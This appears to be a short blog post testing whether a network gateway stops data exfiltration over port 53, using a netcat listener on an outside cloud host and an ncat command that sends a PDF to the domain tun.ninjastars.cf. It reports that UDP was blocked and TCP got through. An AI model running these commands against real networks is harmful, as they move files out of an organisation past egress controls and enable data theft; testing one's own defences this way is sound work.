---
layout: post
title:  "Data Exfiltration over DNS (netcat)"
date:   2021-03-14 14:11:15 -0400
categories: exfiltration 
tags: gateway bypass
---
<p>
Once an environment has been compromised and the adversary finds some desirable data the data needs to be removed from the network. In this use case we will assume that common protocols like FTP and SSH are heavily restricted on egress traffic (as they should be) so a simple listener will be open on the DNS port which is more commonly permitted.
</p>

<h3>Step 1 - Start the Listener</h3>

<p>
In this example the listener is being run on a Linux host outside of the LAN and is in GCP.
</p>

<p>nc is like a networking swiss army knife, -u means UDP, -l means listen, -p specifies port 53, and > data indicates to store all of the data received in a file called data.
</p>
<br>
<code>
  nc -u -l -p 53 > data
</code>
<br>

<h3>Step 2 - Send a File</h3>

<p>
We will attempt to move the data from a host protected by Gateway or Magic WAN.
</p>

<p>
This time netcat is being run with -u for UDP, the target is tun.ninjastars.cf which is just an A record, the port is 53 to appear as DNS, and < rp_DBIR_2017_Report_en_xg.pdf sends that PDF over the channel.
</p>
<br>

<code>
  ncat -u tun.ninjastars.cf 53 < rp_DBIR_2017_Report_en_xg.pdf
</code>
<br>


<h3>Step 3 - View the Results</h3>

<p>
The file doesn't show up on the other side. Unfortunately for now there is also not a Gateway log entry.
</p>

<p>
Switching from UDP to TCP by omitting the -u allows for the file to be transferred.
</p>

